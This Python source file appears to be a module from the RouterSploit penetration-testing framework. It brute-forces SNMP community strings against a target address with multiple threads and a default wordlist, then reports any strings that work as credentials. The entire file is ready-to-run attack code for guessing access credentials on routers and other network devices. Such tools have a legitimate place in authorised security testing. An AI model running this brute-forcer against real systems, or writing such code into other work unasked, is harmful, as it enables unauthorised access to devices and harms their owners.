from routersploit.core.exploit import *
from routersploit.core.snmp.snmp_client import SNMPClient
from routersploit.resources import wordlists


class Exploit(SNMPClient):
    __info__ = {
        "name": "SNMP Bruteforce",
        "description": "Module performs bruteforce attack against SNMP service. "
                       "If valid community string is found, it is displayed to the user",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(161, "Target SNMP port")

    version = OptInteger(1, "SNMP version 0:v1, 1:v2c")
    threads = OptInteger(8, "Number of threads")

    defaults = OptWordlist(wordlists.snmp, "SNMP community string or file with default communit stryings (file://)")

    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.strings = []
        self.attack()

    @multi
    def attack(self):
        print_status("Starting bruteforce against SNMP service")

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if len(self.strings):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Community String")
            print_table(headers, *self.strings)
        else:
            print_error("Valid community strings not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                community_string = data.next()

                snmp_client = self.snmp_create()
                if snmp_client.get(community_string, "1.3.6.1.2.1.1.1.0", version=self.version):
                    if self.stop_on_success:
                        running.clear()

                    self.strings.append((self.target, self.port, self.target_protocol, community_string))

            except StopIteration:
                break

    def check(self):
        raise NotImplementedError("Check method is not available")

    @mute
    def check_default(self):
        self.strings = []

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.strings:
            return self.strings

        return None
